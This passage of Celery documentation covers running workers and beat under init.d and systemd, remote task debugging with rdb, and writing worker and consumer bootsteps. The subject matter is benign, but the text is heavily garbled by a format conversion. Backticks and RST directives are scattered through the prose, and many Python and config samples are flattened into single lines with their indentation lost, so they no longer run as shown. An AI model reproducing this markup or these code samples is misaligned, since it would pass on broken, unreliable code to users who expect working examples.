CELERYD\_CHDIR="/opt/MyProject" `` ` .. _generic-initd-celerybeat-options:  Available options ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  * ``CELERY\_APP``App instance to use (value for :option:`--app <celery --app>` argument).  *``CELERYBEAT\_OPTS``Additional arguments to :program:`celery beat`, see     :command:`celery beat --help` for a list of available options.  *``CELERYBEAT\_PID\_FILE``Full path to the PID file. Default is :file:`/var/run/celeryd.pid`.  *``CELERYBEAT\_LOG\_FILE``Full path to the log file. Default is :file:`/var/log/celeryd.log`.  *``CELERYBEAT\_LOG\_LEVEL`Log level to use. Default is`INFO`.  *`CELERYBEAT\_USER`User to run beat as. Default is the current user.  *`CELERYBEAT\_GROUP`Group to run beat as. Default is the current user.  *`CELERY\_CREATE\_DIRS`Always create directories (log directory and pid file directory).     Default is to only create directories when no custom logfile/pidfile set.  *`CELERY\_CREATE\_RUNDIR`Always create pidfile directory. By default only enabled when no custom     pidfile location set.  *`CELERY\_CREATE\_LOGDIR`Always create logfile directory. By default only enable when no custom     logfile location set.  .. _generic-initd-troubleshooting:  Troubleshooting ----------------------------------------------------------------------  If you can't get the init-scripts to work, you should try running them in *verbose mode*:`\`console \# sh -x /etc/init.d/celeryd start

This can reveal hints as to why the service won't start.

If the worker starts with *"OK"* but exits almost immediately afterwards `` ` and there's no evidence in the log file, then there's probably an error but as the daemons standard outputs are already closed you'll not be able to see them anywhere. For this situation you can use the :envvar:`C_FAKEFORK` environment variable to skip the daemonization step: ``\`console \# C\_FAKEFORK=1 sh -x /etc/init.d/celeryd start

and now you should be able to see the errors.

Commonly such errors are caused by insufficient permissions `` ` to read from, or write to a file, and also by syntax errors in configuration modules, user modules, third-party libraries, or even from Celery itself (if you've found a bug you should [report it <reporting-bugs>](#report-it-<reporting-bugs>)).   .. _daemon-systemd-generic:  Usage ``systemd``======================================================================  * `extra/systemd/`_     .. _generic-systemd-celery:  :Usage: `systemctl {start|stop|restart|status} celery.service` :Configuration file: /etc/conf.d/celery  Service file: celery.service ----------------------------------------------------------------------  This is an example systemd file:  :file:`/etc/systemd/system/celery.service`:``\`bash \[Unit\] Description=Celery Service After=network.target

> \[Service\] Type=forking User=celery Group=celery EnvironmentFile=/etc/conf.d/celery WorkingDirectory=/opt/celery ExecStart=/bin/sh -c '${CELERY\_BIN} -A $CELERY\_APP multi start $CELERYD\_NODES --pidfile=${CELERYD\_PID\_FILE} --logfile=${CELERYD\_LOG\_FILE} --loglevel="${CELERYD\_LOG\_LEVEL}" $CELERYD\_OPTS' ExecStop=/bin/sh -c '${CELERY\_BIN} multi stopwait $CELERYD\_NODES --pidfile=${CELERYD\_PID\_FILE} --logfile=${CELERYD\_LOG\_FILE} --loglevel="${CELERYD\_LOG\_LEVEL}"' ExecReload=/bin/sh -c '${CELERY\_BIN} -A $CELERY\_APP multi restart $CELERYD\_NODES --pidfile=${CELERYD\_PID\_FILE} --logfile=${CELERYD\_LOG\_FILE} --loglevel="${CELERYD\_LOG\_LEVEL}" $CELERYD\_OPTS' Restart=always
> 
> \[Install\] WantedBy=multi-user.target

Once you've put that file in `/etc/systemd/system`, you should run `` ` :command:`systemctl daemon-reload` in order that Systemd acknowledges that file. You should also run that command each time you modify it. Use :command:`systemctl enable celery.service` if you want the celery service to automatically start when (re)booting the system.  Optionally you can specify extra dependencies for the celery service: e.g. if you use RabbitMQ as a broker, you could specify ``rabbitmq-server.service`in both`After=`and`Requires=`in the`\[Unit\]`` `systemd section <https://www.freedesktop.org/software/systemd/man/systemd.unit.html#%5BUnit%5D%20Section%20Options>`_.  To configure user, group, :command:`chdir` change settings: ``User`,`Group`, and`WorkingDirectory`` defined in :file:`/etc/systemd/system/celery.service`.  You can also use systemd-tmpfiles in order to create working directories (for logs and pid).  :file: `/etc/tmpfiles.d/celery.conf` ``\`bash d /run/celery 0755 celery celery - d /var/log/celery 0755 celery celery -

<div id="generic-systemd-celery-example">

Example configuration `` ` ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  This is an example configuration for a Python project:  :file:`/etc/conf.d/celery`: ``\`bash \# Name of nodes to start \# here we have a single node CELERYD\_NODES="w1" \# or we could have three nodes: \#CELERYD\_NODES="w1 w2 w3"

</div>

> \# Absolute or relative path to the 'celery' command: CELERY\_BIN="/usr/local/bin/celery" \#CELERY\_BIN="/virtualenvs/def/bin/celery"
> 
> \# App instance to use \# comment out this line if you don't use an app CELERY\_APP="proj" \# or fully qualified: \#CELERY\_APP="proj.tasks:app"
> 
> \# How to call manage.py CELERYD\_MULTI="multi"
> 
> \# Extra command-line arguments to the worker CELERYD\_OPTS="--time-limit=300 --concurrency=8"
> 
> \# - %n will be replaced with the first part of the nodename. \# - %I will be replaced with the current child process index \# and is important when using the prefork pool to avoid race conditions. CELERYD\_PID\_FILE="/var/run/celery/%n.pid" CELERYD\_LOG\_FILE="/var/log/celery/%n%I.log" CELERYD\_LOG\_LEVEL="INFO"
> 
> \# you may wish to add these options for Celery Beat CELERYBEAT\_PID\_FILE="/var/run/celery/beat.pid" CELERYBEAT\_LOG\_FILE="/var/log/celery/beat.log"

Service file: celerybeat.service `` ` ----------------------------------------------------------------------  This is an example systemd file for Celery Beat:  :file:`/etc/systemd/system/celerybeat.service`: ``\`bash \[Unit\] Description=Celery Beat Service After=network.target

> \[Service\] Type=simple User=celery Group=celery EnvironmentFile=/etc/conf.d/celery WorkingDirectory=/opt/celery ExecStart=/bin/sh -c '${CELERY\_BIN} -A ${CELERY\_APP} beat --pidfile=${CELERYBEAT\_PID\_FILE} --logfile=${CELERYBEAT\_LOG\_FILE} --loglevel=${CELERYD\_LOG\_LEVEL}' Restart=always
> 
> \[Install\] WantedBy=multi-user.target

Once you've put that file in `/etc/systemd/system`, you should run `` ` :command:`systemctl daemon-reload` in order that Systemd acknowledges that file. You should also run that command each time you modify it. Use :command:`systemctl enable celerybeat.service` if you want the celery beat service to automatically start when (re)booting the system.  Running the worker with superuser privileges (root) ======================================================================  Running the worker with superuser privileges is a very dangerous practice. There should always be a workaround to avoid running as root. Celery may run arbitrary code in messages serialized with pickle - this is dangerous, especially when run as root.  By default Celery won't run workers as root. The associated error message may not be visible in the logs but may be seen if :envvar:`C_FAKEFORK` is used.  To force Celery to run workers as root use :envvar:`C_FORCE_ROOT`.  When running as root without :envvar:`C_FORCE_ROOT` the worker will appear to start with *"OK"* but exit immediately after with no apparent errors. This problem may appear when running the project in a new development or production environment (inadvertently) as root.  .. _daemon-supervisord:  :pypi:`supervisor` ======================================================================  * `extra/supervisord/`_     .. _daemon-launchd: ``launchd\`\` (macOS) ======================================================================

  - [extra/macOS](https://github.com/celery/celery/tree/main/extra/macOS/)

---

debugging.md

---

# Debugging

## Debugging Tasks Remotely (using pdb)

### Basics

`celery.contrib.rdb` is an extended version of `pdb` that enables remote debugging of processes that doesn't have terminal access.

Example usage:

`` `python     from celery import task     from celery.contrib import rdb      @task()     def add(x, y):         result = x + y         rdb.set_trace()  # <- set break-point         return result   `~celery.contrib.rdb.set_trace` sets a break-point at the current ``\` location and creates a socket you can telnet into to remotely debug your task.

The debugger may be started by multiple processes at the same time, so rather than using a fixed port the debugger will search for an available port, starting from the base port (6900 by default). The base port can be changed using the environment variable `CELERY_RDB_PORT`.

By default the debugger will only be available from the local host, to enable access from the outside you have to set the environment variable `CELERY_RDB_HOST`.

When the worker encounters your break-point it'll log the following information:

`` `text     [INFO/MainProcess] Received task:         tasks.add[d7261c71-4962-47e5-b342-2448bedd20e8]     [WARNING/PoolWorker-1] Remote Debugger:6900:         Please telnet 127.0.0.1 6900.  Type `exit` in session to continue.     [2011-01-18 14:25:44,119: WARNING/PoolWorker-1] Remote Debugger:6900:         Waiting for client...  If you telnet the port specified you'll be presented ``<span class="title-ref"> with a \`pdb</span> shell:

`` `console     $ telnet localhost 6900     Connected to localhost.     Escape character is '^]'.     > /opt/devel/demoapp/tasks.py(128)add()     -> return result     (Pdb)  Enter ``help`to get a list of available commands,`<span class="title-ref"> It may be a good idea to read the \`Python Debugger Manual</span>\_ if you have never used <span class="title-ref">pdb</span> before.

To demonstrate, we'll read the value of the `result` variable, change it and continue execution of the task:

`` `text     (Pdb) result     4     (Pdb) result = 'hello from rdb'     (Pdb) continue     Connection closed by foreign host.  The result of our vandalism can be seen in the worker logs:  .. code-block:: text      [2011-01-18 14:35:36,599: INFO/MainProcess] Task         tasks.add[d7261c71-4962-47e5-b342-2448bedd20e8] succeeded         in 61.481s: 'hello from rdb'     Tips ``\` ----

#### Enabling the break-point signal

If the environment variable `CELERY_RDBSIG` is set, the worker will open up an rdb instance whenever the <span class="title-ref">SIGUSR2</span> signal is sent. This is the case for both main and worker processes.

For example starting the worker with:

`` `console     $ CELERY_RDBSIG=1 celery worker -l INFO  You can start an rdb session for any of the worker processes by executing:  .. code-block:: console      $ kill -USR2 <pid> ``\`

---

extending.md

---

# Extensions and Bootsteps

<div class="contents" data-local="" data-depth="2">

</div>

## Custom Message Consumers

You may want to embed custom Kombu consumers to manually process your messages.

For that purpose a special <span class="title-ref">\~celery.bootstep.ConsumerStep</span> bootstep class exists, where you only need to define the `get_consumers` method, that must return a list of <span class="title-ref">kombu.Consumer</span> objects to start whenever the connection is established:

`` `python     from celery import Celery     from celery import bootsteps     from kombu import Consumer, Exchange, Queue      my_queue = Queue('custom', Exchange('custom'), 'routing_key')      app = Celery(broker='amqp://')       class MyConsumerStep(bootsteps.ConsumerStep):          def get_consumers(self, channel):             return [Consumer(channel,                              queues=[my_queue],                              callbacks=[self.handle_message],                              accept=['json'])]          def handle_message(self, body, message):             print('Received message: {0!r}'.format(body))             message.ack()     app.steps['consumer'].add(MyConsumerStep)      def send_me_a_message(who, producer=None):         with app.producer_or_acquire(producer) as producer:             producer.publish(                 {'hello': who},                 serializer='json',                 exchange=my_queue.exchange,                 routing_key='routing_key',                 declare=[my_queue],                 retry=True,             )      if __name__ == '__main__':         send_me_a_message('world!')   > **Note** >      Kombu Consumers can take use of two different message callback dispatching     mechanisms. The first one is the ``callbacks`argument that accepts     a list of callbacks with a`(body, message)`signature,     the second one is the`on\_message`argument that takes a single     callback with a`(message,)`signature. The latter won't     automatically decode and deserialize the payload.      .. code-block:: python          def get_consumers(self, channel):             return [Consumer(channel, queues=[my_queue],                              on_message=self.on_message)]           def on_message(self, message):             payload = message.decode()             print(                 'Received message: {0!r} {props!r} rawlen={s}'.format(                 payload, props=message.properties, s=len(message.body),             ))             message.ack()  .. _extending-blueprints:  Blueprints`\` ==========

Bootsteps is a technique to add functionality to the workers. A bootstep is a custom class that defines hooks to do custom actions at different stages in the worker. Every bootstep belongs to a blueprint, and the worker currently defines two blueprints: **Worker**, and **Consumer**

-----

  - **Figure A:** Bootsteps in the Worker and Consumer blueprints. Starting  
    from the bottom up the first step in the worker blueprint is the Timer, and the last step is to start the Consumer blueprint, that then establishes the broker connection and starts consuming messages.

![](../images/worker_graph_full.png)

-----

## Worker

The Worker is the first blueprint to start, and with it starts major components like the event loop, processing pool, and the timer used for ETA tasks and other timed events.

When the worker is fully started it continues with the Consumer blueprint, that sets up how tasks are executed, connects to the broker and starts the message consumers.

The <span class="title-ref">\~celery.worker.WorkController</span> is the core worker implementation, and contains several methods and attributes that you can use in your bootstep.

### Attributes

<div id="extending-worker-app">

<div class="attribute">

app

The current app instance.

</div>

</div>

<div id="extending-worker-hostname">

<div class="attribute">

hostname

The workers node name (e.g., <span class="title-ref">worker1@example.com</span>)

</div>

</div>

<div id="extending-worker-blueprint">

<div class="attribute">

blueprint

This is the worker <span class="title-ref">\~celery.bootsteps.Blueprint</span>.

</div>

</div>

<div id="extending-worker-hub">

<div class="attribute">

hub

Event loop object (<span class="title-ref">\~kombu.asynchronous.Hub</span>). You can use this to register callbacks in the event loop.

This is only supported by async I/O enabled transports (amqp, redis), in which case the <span class="title-ref">worker.use\_eventloop</span> attribute should be set.

Your worker bootstep must require the Hub bootstep to use this:

  - \`\`\`python
    
      - class WorkerStep(bootsteps.StartStopStep):  
        requires = {'celery.worker.components:Hub'}

</div>

</div>

<div id="extending-worker-pool">

<div class="attribute">

pool

The current process/eventlet/gevent/thread pool. See <span class="title-ref">celery.concurrency.base.BasePool</span>.

Your worker bootstep must require the Pool bootstep to use this:

``` python
class WorkerStep(bootsteps.StartStopStep):
    requires = {'celery.worker.components:Pool'}
```

</div>

</div>

<div id="extending-worker-timer">

<div class="attribute">

timer

<span class="title-ref">\~kombu.asynchronous.timer.Timer</span> used to schedule functions.

Your worker bootstep must require the Timer bootstep to use this:

``` python
class WorkerStep(bootsteps.StartStopStep):
    requires = {'celery.worker.components:Timer'}
```

</div>

</div>

<div id="extending-worker-statedb">

<div class="attribute">

statedb

<span class="title-ref">Database \<celery.worker.state.Persistent\></span>\` to persist state between worker restarts.

This is only defined if the `statedb` argument is enabled.

Your worker bootstep must require the `Statedb` bootstep to use this:

``` python
class WorkerStep(bootsteps.StartStopStep):
    requires = {'celery.worker.components:Statedb'}
```

</div>

</div>

<div id="extending-worker-autoscaler">

<div class="attribute">

autoscaler

<span class="title-ref">\~celery.worker.autoscaler.Autoscaler</span> used to automatically grow and shrink the number of processes in the pool.

This is only defined if the `autoscale` argument is enabled.

Your worker bootstep must require the <span class="title-ref">Autoscaler</span> bootstep to use this:

``` python
class WorkerStep(bootsteps.StartStopStep):
    requires = ('celery.worker.autoscaler:Autoscaler',)
```

</div>

</div>

<div id="extending-worker-autoreloader">

<div class="attribute">

autoreloader

<span class="title-ref">\~celery.worker.autoreloder.Autoreloader</span> used to automatically reload use code when the file-system changes.

This is only defined if the `autoreload` argument is enabled. Your worker bootstep must require the <span class="title-ref">Autoreloader</span> bootstep to use this;

``` python
class WorkerStep(bootsteps.StartStopStep):
    requires = ('celery.worker.autoreloader:Autoreloader',)
```

</div>

</div>

Example worker bootstep `` ` -----------------------  An example Worker bootstep could be: ``\`python from celery import bootsteps

>   - class ExampleWorkerStep(bootsteps.StartStopStep):  
>     requires = {'celery.worker.components:Pool'}
>     
>       - def \_\_init\_\_(self, worker, \*\*kwargs):  
>         print('Called when the WorkController instance is constructed') print('Arguments to WorkController: {0\!r}'.format(kwargs))
>     
>       - def create(self, worker):  
>         \# this method can be used to delegate the action methods \# to another object that implements `start` and `stop`. return self
>     
>       - def start(self, worker):  
>         print('Called when the worker is started.')
>     
>       - def stop(self, worker):  
>         print('Called when the worker shuts down.')
>     
>       - def terminate(self, worker):  
>         print('Called when the worker terminates')

Every method is passed the current `WorkController` instance as the first `` ` argument.  Another example could use the timer to wake up at regular intervals: ``\`python from celery import bootsteps

>   - class DeadlockDetection(bootsteps.StartStopStep):  
>     requires = {'celery.worker.components:Timer'}
>     
>       - def \_\_init\_\_(self, worker, deadlock\_timeout=3600):  
>         self.timeout = deadlock\_timeout self.requests = \[\] self.tref = None
>     
>       - def start(self, worker):  
>         \# run every 30 seconds. self.tref = worker.timer.call\_repeatedly( 30.0, self.detect, (worker,), priority=10, )
>     
>       - def stop(self, worker):
>         
>           - if self.tref:  
>             self.tref.cancel() self.tref = None
>     
>       - def detect(self, worker):  
>         \# update active requests for req in worker.active\_requests: if req.time\_start and time() - req.time\_start \> self.timeout: raise SystemExit()

Customizing Task Handling Logs `` ` ------------------------------  The Celery worker emits messages to the Python logging subsystem for various events throughout the lifecycle of a task. These messages can be customized by overriding the ``[LOG]()\<TYPE\>``format strings which are defined in :file:`celery/app/trace.py`. For example:``\`python import celery.app.trace

> celery.app.trace.LOG\_SUCCESS = "This is a custom message"

The various format strings are all provided with the task name and ID for `` ` ``%`formatting, and some of them receive extra fields like the return value or the exception which caused a task to fail. These fields can be used in custom format strings like so:`\`python import celery.app.trace

> celery.app.trace.LOG\_REJECTED = "%(name)r is cursed and I won't run it: %(exc)s"

<div id="extending-consumer_blueprint">

Consumer `` ` ========  The Consumer blueprint establishes a connection to the broker, and is restarted every time this connection is lost. Consumer bootsteps include the worker heartbeat, the remote control command consumer, and importantly, the task consumer.  When you create consumer bootsteps you must take into account that it must be possible to restart your blueprint. An additional 'shutdown' method is defined for consumer bootsteps, this method is called when the worker is shutdown.  .. _extending-consumer-attributes:  Attributes ----------  .. _extending-consumer-app:  .. attribute:: app      The current app instance.  .. _extending-consumer-controller:  .. attribute:: controller      The parent `~@WorkController` object that created this consumer.  .. _extending-consumer-hostname:  .. attribute:: hostname      The workers node name (e.g., `worker1@example.com`)  .. _extending-consumer-blueprint:  .. attribute:: blueprint      This is the worker `~celery.bootsteps.Blueprint`.  .. _extending-consumer-hub:  .. attribute:: hub      Event loop object (`~kombu.asynchronous.Hub`). You can use     this to register callbacks in the event loop.      This is only supported by async I/O enabled transports (amqp, redis),     in which case the `worker.use_eventloop` attribute should be set.      Your worker bootstep must require the Hub bootstep to use this: ``\`python class WorkerStep(bootsteps.StartStopStep): requires = {'celery.worker.components:Hub'}

</div>

<div id="extending-consumer-connection">

<div class="attribute">

connection

The current broker connection (<span class="title-ref">kombu.Connection</span>).

A consumer bootstep must require the 'Connection' bootstep to use this:

``` python
class Step(bootsteps.StartStopStep):
    requires = {'celery.worker.consumer.connection:Connection'}
```

</div>

</div>

<div id="extending-consumer-event_dispatcher">

<div class="attribute">

event\_dispatcher

A <span class="title-ref">@events.Dispatcher</span> object that can be used to send events.

A consumer bootstep must require the <span class="title-ref">Events</span> bootstep to use this.

``` python
class Step(bootsteps.StartStopStep):
    requires = {'celery.worker.consumer.events:Events'}
```

</div>

</div>

<div id="extending-consumer-gossip">

<div class="attribute">

gossip

Worker to worker broadcast communication (<span class="title-ref">\~celery.worker.consumer.gossip.Gossip</span>).

A consumer bootstep must require the <span class="title-ref">Gossip</span> bootstep to use this.

``` python
class RatelimitStep(bootsteps.StartStopStep):
    """Rate limit tasks based on the number of workers in the
    cluster."""
    requires = {'celery.worker.consumer.gossip:Gossip'}

    def start(self, c):
        self.c = c
        self.c.gossip.on.node_join.add(self.on_cluster_size_change)
        self.c.gossip.on.node_leave.add(self.on_cluster_size_change)
        self.c.gossip.on.node_lost.add(self.on_node_lost)
        self.tasks = [
            self.app.tasks['proj.tasks.add']
            self.app.tasks['proj.tasks.mul']
        ]
        self.last_size = None

    def on_cluster_size_change(self, worker):
        cluster_size = len(list(self.c.gossip.state.alive_workers()))
        if cluster_size != self.last_size:
            for task in self.tasks:
                task.rate_limit = 1.0 / cluster_size
            self.c.reset_rate_limits()
            self.last_size = cluster_size

    def on_node_lost(self, worker):
        # may have processed heartbeat too late, so wake up soon
        # in order to see if the worker recovered.
        self.c.timer.call_after(10.0, self.on_cluster_size_change)
```

**Callbacks**

  - `<set> gossip.on.node_join`
    
    > Called whenever a new node joins the cluster, providing a <span class="title-ref">\~celery.events.state.Worker</span> instance.

  - `<set> gossip.on.node_leave`
    
    > Called whenever a new node leaves the cluster (shuts down), providing a <span class="title-ref">\~celery.events.state.Worker</span> instance.

  - `<set> gossip.on.node_lost`
    
    > Called whenever heartbeat was missed for a worker instance in the cluster (heartbeat not received or processed in time), providing a <span class="title-ref">\~celery.events.state.Worker</span> instance.
    > 
    > This doesn't necessarily mean the worker is actually offline, so use a time out mechanism if the default heartbeat timeout isn't sufficient.

</div>

</div>

<div id="extending-consumer-pool">

<div class="attribute">

pool

The current process/eventlet/gevent/thread pool. See <span class="title-ref">celery.concurrency.base.BasePool</span>.

</div>

</div>

<div id="extending-consumer-timer">

<div class="attribute">

timer

<span class="title-ref">Timer \<celery.utils.timer2.Schedule</span> used to schedule functions.

</div>

</div>

<div id="extending-consumer-heart">

<div class="attribute">

heart

Responsible for sending worker event heartbeats (<span class="title-ref">\~celery.worker.heartbeat.Heart</span>).

Your consumer bootstep must require the <span class="title-ref">Heart</span> bootstep to use this:

``` python
class Step(bootsteps.StartStopStep):
    requires = {'celery.worker.consumer.heart:Heart'}
```

</div>

</div>

<div id="extending-consumer-task_consumer">

<div class="attribute">

task\_consumer

The <span class="title-ref">kombu.Consumer</span> object used to consume task messages.

Your consumer bootstep must require the <span class="title-ref">Tasks</span> bootstep to use this:

``` python
class Step(bootsteps.StartStopStep):
    requires = {'celery.worker.consumer.tasks:Tasks'}
```

</div>

</div>

<div id="extending-consumer-strategies">

<div class="attribute">

strategies

Every registered task type has an entry in this mapping, where the value is used to execute an incoming message of this task type (the task execution strategy). This mapping is generated by the Tasks bootstep when the consumer starts:

``` python
for name, task in app.tasks.items():
    strategies[name] = task.start_strategy(app, consumer)
    task.__trace__ = celery.app.trace.build_tracer(
        name, task, loader, hostname
    )
```

Your consumer bootstep must require the <span class="title-ref">Tasks</span> bootstep to use this:

``` python
class Step(bootsteps.StartStopStep):
    requires = {'celery.worker.consumer.tasks:Tasks'}
```

</div>

</div>

<div id="extending-consumer-task_buckets">

<div class="attribute">

task\_buckets

A <span class="title-ref">\~collections.defaultdict</span> used to look-up the rate limit for a task by type. Entries in this dict may be None (for no limit) or a <span class="title-ref">\~kombu.utils.limits.TokenBucket</span> instance implementing `consume(tokens)` and `expected_time(tokens)`.

TokenBucket implements the [token bucket algorithm](), but any algorithm may be used as long as it conforms to the same interface and defines the two methods above.

</div>

</div>

<div id="extending_consumer-qos">

<div class="attribute">

qos

The <span class="title-ref">\~kombu.common.QoS</span> object can be used to change the task channels current prefetch\_count value:

``` python
# increment at next cycle
consumer.qos.increment_eventually(1)
# decrement at next cycle
consumer.qos.decrement_eventually(1)
consumer.qos.set(10)
```

</div>

</div>

Methods `` ` -------  .. method:: consumer.reset_rate_limits()      Updates the ``task\_buckets`mapping for all registered task types.  .. method:: consumer.bucket_for_task(type, Bucket=TokenBucket)      Creates rate limit bucket for a task using its`task.rate\_limit`attribute.  .. method:: consumer.add_task_queue(name, exchange=None, exchange_type=None,                                     routing_key=None, \*\*options):      Adds new queue to consume from. This will persist on connection restart.  .. method:: consumer.cancel_task_queue(name)      Stop consuming from queue by name. This will persist on connection     restart.  .. method:: apply_eta_task(request)      Schedule ETA task to execute based on the`request.eta``attribute.     (`~celery.worker.request.Request`)    .. _extending-bootsteps:  Installing Bootsteps ====================``app.steps\['worker'\]`and`app.steps\['consumer'\]`can be modified to add new bootsteps:`\`pycon \>\>\> app = Celery() \>\>\> app.steps\['worker'\].add(MyWorkerStep) \# \< add class, don't instantiate \>\>\> app.steps\['consumer'\].add(MyConsumerStep)

> \>\>\> app.steps\['consumer'\].update(\[StepA, StepB\])
> 
> \>\>\> app.steps\['consumer'\] {step:proj.StepB{()}, step:proj.MyConsumerStep{()}, step:proj.StepA{()}

The order of steps isn't important here as the order is decided by the `` ` resulting dependency graph ( ``Step.requires`).  To illustrate how you can install bootsteps and how they work, this is an example step that prints some useless debugging information. It can be added both as a worker and consumer bootstep:`\`python from celery import Celery from celery import bootsteps

> class InfoStep(bootsteps.Step):
> 
> >   - def \_\_init\_\_(self, parent, \*\*kwargs):  
> >     \# here we can prepare the Worker/Consumer object \# in any way we want, set attribute defaults, and so on. print('{0\!r} is in init'.format(parent))
> > 
> >   - def start(self, parent):  
> >     \# our step is started together with all other Worker/Consumer \# bootsteps. print('{0\!r} is starting'.format(parent))
> > 
> >   - def stop(self, parent):  
> >     \# the Consumer calls stop every time the consumer is \# restarted (i.e., connection is lost) and also at shutdown. \# The Worker will call stop at shutdown only. print('{0\!r} is stopping'.format(parent))
> > 
> >   - def shutdown(self, parent):  
> >     \# shutdown is called by the Consumer at shutdown, it's not \# called by Worker. print('{0\!r} is shutting down'.format(parent))
> > 
> > app = Celery(broker='amqp://') app.steps\['worker'\].add(InfoStep) app.steps\['consumer'\].add(InfoStep)

Starting the worker with this step installed will give us the following `` ` logs: ``\`text \<Worker: <w@example.com> (initializing)\> is in init \<Consumer: <w@example.com> (initializing)\> is in init \[2013-05-29 16:18:20,544: WARNING/MainProcess\] \<Worker: <w@example.com> (running)\> is starting \[2013-05-29 16:18:21,577: WARNING/MainProcess\] \<Consumer: <w@example.com> (running)\> is starting \<Consumer: <w@example.com> (closing)\> is stopping \<Worker: <w@example.com> (closing)\> is stopping \<Consumer: <w@example.com> (terminating)\> is shutting down

The `print` statements will be redirected to the logging subsystem after `` ` the worker has been initialized, so the "is starting" lines are time-stamped. You may notice that this does no longer happen at shutdown, this is because the ``stop`and`shutdown``methods are called inside a *signal handler*, and it's not safe to use logging inside such a handler. Logging with the Python logging module isn't :term:`reentrant`: meaning you cannot interrupt the function then call it again later. It's important that the``stop`and`shutdown``methods you write is also :term:`reentrant`.  Starting the worker with :option:`--loglevel=debug <celery worker --loglevel>` will show us more information about the boot process:``\`text \[2013-05-29 16:18:20,509: DEBUG/MainProcess\] | Worker: Preparing bootsteps. \[2013-05-29 16:18:20,511: DEBUG/MainProcess\] | Worker: Building graph... \<celery.apps.worker.Worker object at 0x101ad8410\> is in init \[2013-05-29 16:18:20,511: DEBUG/MainProcess\] | Worker: New boot order: {Hub, Pool, Timer, StateDB, Autoscaler, InfoStep, Beat, Consumer} \[2013-05-29 16:18:20,514: DEBUG/MainProcess\] | Consumer: Preparing bootsteps. \[2013-05-29 16:18:20,514: DEBUG/MainProcess\] | Consumer: Building graph... \<celery.worker.consumer.Consumer object at 0x101c2d8d0\> is in init \[2013-05-29 16:18:20,515: DEBUG/MainProcess\] | Consumer: New boot order: {Connection, Mingle, Events, Gossip, InfoStep, Agent, Heart, Control, Tasks, event loop} \[2013-05-29 16:18:20,522: DEBUG/MainProcess\] | Worker: Starting Hub \[2013-05-29 16:18:20,522: DEBUG/MainProcess\] ^-- substep ok \[2013-05-29 16:18:20,522: DEBUG/MainProcess\] | Worker: Starting Pool \[2013-05-29 16:18:20,542: DEBUG/MainProcess\] ^-- substep ok \[2013-05-29 16:18:20,543: DEBUG/MainProcess\] | Worker: Starting InfoStep \[2013-05-29 16:18:20,544: WARNING/MainProcess\] \<celery.apps.worker.Worker object at 0x101ad8410\> is starting \[2013-05-29 16:18:20,544: DEBUG/MainProcess\] ^-- substep ok \[2013-05-29 16:18:20,544: DEBUG/MainProcess\] | Worker: Starting Consumer \[2013-05-29 16:18:20,544: DEBUG/MainProcess\] | Consumer: Starting Connection \[2013-05-29 16:18:20,559: INFO/MainProcess\] Connected to amqp://<guest@127.0.0.1>:5672// \[2013-05-29 16:18:20,560: DEBUG/MainProcess\] ^-- substep ok \[2013-05-29 16:18:20,560: DEBUG/MainProcess\] | Consumer: Starting Mingle \[2013-05-29 16:18:20,560: INFO/MainProcess\] mingle: searching for neighbors \[2013-05-29 16:18:21,570: INFO/MainProcess\] mingle: no one here \[2013-05-29 16:18:21,570: DEBUG/MainProcess\] ^-- substep ok \[2013-05-29 16:18:21,571: DEBUG/MainProcess\] | Consumer: Starting Events \[2013-05-29 16:18:21,572: DEBUG/MainProcess\] ^-- substep ok \[2013-05-29 16:18:21,572: DEBUG/MainProcess\] | Consumer: Starting Gossip \[2013-05-29 16:18:21,577: DEBUG/MainProcess\] ^-- substep ok \[2013-05-29 16:18:21,577: DEBUG/MainProcess\] | Consumer: Starting InfoStep \[2013-05-29 16:18:21,577: WARNING/MainProcess\] \<celery.worker.consumer.Consumer object at 0x101c2d8d0\> is starting \[2013-05-29 16:18:21,578: DEBUG/MainProcess\] ^-- substep ok \[2013-05-29 16:18:21,578: DEBUG/MainProcess\] | Consumer: Starting Heart \[2013-05-29 16:18:21,579: DEBUG/MainProcess\] ^-- substep ok \[2013-05-29 16:18:21,579: DEBUG/MainProcess\] | Consumer: Starting Control \[2013-05-29 16:18:21,583: DEBUG/MainProcess\] ^-- substep ok \[2013-05-29 16:18:21,583: DEBUG/MainProcess\] | Consumer: Starting Tasks \[2013-05-29 16:18:21,606: DEBUG/MainProcess\] basic.qos: prefetch\_count-\>80 \[2013-05-29 16:18:21,606: DEBUG/MainProcess\] ^-- substep ok \[2013-05-29 16:18:21,606: DEBUG/MainProcess\] | Consumer: Starting event loop \[2013-05-29 16:18:21,608: WARNING/MainProcess\] <celery@example.com> ready.

<div id="extending-programs">

Command-line programs `` ` =====================  .. _extending-commandoptions:  Adding new command-line options -------------------------------  .. _extending-command-options:  Command-specific options ~~~~~~~~~~~~~~~~~~~~~~~~  You can add additional command-line options to the ``worker`,`beat`, and`events``commands by modifying the `~@user_options` attribute of the application instance.  Celery commands uses the :mod:`click` module to parse command-line arguments, and so to add custom arguments you need to add `click.Option` instances to the relevant set.  Example adding a custom option to the :program:`celery worker` command:``\`python from celery import Celery from click import Option

</div>

> app = Celery(broker='amqp://')
> 
>   - app.user\_options\['worker'\].add(Option(('--enable-my-option',),  
>     is\_flag=True, help='Enable custom option.'))

All bootsteps will now receive this argument as a keyword argument to `` ` ``Bootstep.\_\_init\_\_`:`\`python from celery import bootsteps

> class MyBootstep(bootsteps.Step):
> 
> >   - def \_\_init\_\_(self, parent, enable\_my\_option=False, **options): super().\_\_init\_\_(parent,**options)
> >     
> >       - if enable\_my\_option:  
> >         party()
> 
> app.steps\['worker'\].add(MyBootstep)

<div id="extending-preload_options">

Preload options `` ` ~~~~~~~~~~~~~~~  The :program:`celery` umbrella command supports the concept of 'preload options'.  These are special options passed to all sub-commands.  You can add new preload options, for example to specify a configuration template: ``\`python from celery import Celery from celery import signals from click import Option

</div>

> app = Celery()
> 
>   - app.user\_options\['preload'\].add(Option(('-Z', '--template'),  
>     default='default', help='Configuration template to use.'))
> 
> @signals.user\_preload\_options.connect def on\_preload\_parsed(options, \*\*kwargs): use\_template(options\['template'\])

<div id="extending-subcommands">

